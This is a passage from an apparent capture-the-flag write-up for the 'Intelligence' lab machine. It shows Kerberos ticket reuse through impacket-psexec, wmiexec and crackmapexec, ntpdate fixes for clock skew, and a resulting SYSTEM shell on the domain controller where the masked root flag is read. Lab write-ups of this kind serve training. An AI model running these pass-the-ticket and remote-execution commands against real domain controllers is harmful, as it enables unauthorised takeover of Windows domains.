[-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid) ←
```
❌

`KRB5CCNAME=./Administrator.ccache impacket-psexec 'intelligence.htb/administrator@dc.intelligence.htb' -k -no-pass`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete. ←
```
❌

`sudo ntpdate 10.10.10.248`:
```
2024-10-31 23:26:15.130775 (+0100) +25197.836583 +/- 0.023663 10.10.10.248 s1 no-leap
CLOCK: time stepped by 25197.836583 ←
```

`KRB5CCNAME=./Administrator.ccache impacket-psexec 'intelligence.htb/administrator@dc.intelligence.htb' -k -no-pass`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$ ←
[*] Uploading file NDyBcJXk.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service ApfT on dc.intelligence.htb.....
[*] Starting service ApfT.....
[-] Something wen't wrong connecting the pipes(<class '__main__.RemoteStdInPipe'>), try again ←
[!] Press help for extra shell commands
```
❌

`KRB5CCNAME=./Administrator.ccache crackmapexec wmi 10.10.10.248 -u 'Administrator' -k --use-kcache`:
```
RPC         10.10.10.248    135    DC               [*] Windows NT 10.0 Build 17763 (name:DC) (domain:intelligence.htb)
RPC         10.10.10.248    135    DC               [-] intelligence.htb\Administrator from ccache KRB_AP_ERR_SKEW ←
```
❌

`sudo ntpdate 10.10.10.248`:
```
2024-10-31 23:26:15.130775 (+0100) +25197.836583 +/- 0.023663 10.10.10.248 s1 no-leap
CLOCK: time stepped by 25197.836583 ←
```

`KRB5CCNAME=./Administrator.ccache crackmapexec wmi 10.10.10.248 -u 'Administrator' -k --use-kcache`:
```
```
❌

`KRB5CCNAME=./Administrator.ccache impacket-wmiexec 'intelligence.htb/administrator@dc.intelligence.htb' -k -no-pass`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] SMB SessionError: code: 0xc0000016 - STATUS_MORE_PROCESSING_REQUIRED - {Still Busy} The specified I/O request packet (IRP) cannot be disposed of because the I/O operation is not complete.
```
❌

`sudo ntpdate 10.10.10.248`:
```
2024-10-31 23:26:15.130775 (+0100) +25197.836583 +/- 0.023663 10.10.10.248 s1 no-leap
CLOCK: time stepped by 25197.836583 ←
```

`KRB5CCNAME=./Administrator.ccache impacket-wmiexec 'intelligence.htb/administrator@dc.intelligence.htb' -k -no-pass`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute ←
[!] Press help for extra shell commands
C:\>
```

![Victim: system](https://custom-icon-badges.demolab.com/badge/Victim-system-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
nt authority\system ←
```

`cd C:\Users\Administrator\Desktop`

`dir`:
```
 Volume in drive C has no label.
 Volume Serial Number is E3EF-EBBD

 Directory of C:\Users\Administrator\Desktop

04/18/2021  04:51 PM    <DIR>          .
04/18/2021  04:51 PM    <DIR>          ..
11/05/2024  01:28 AM                34 root.txt ←
               1 File(s)             34 bytes
               2 Dir(s)   5,874,884,608 bytes free
```

`type root.txt`:
```
c396d*************************** ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
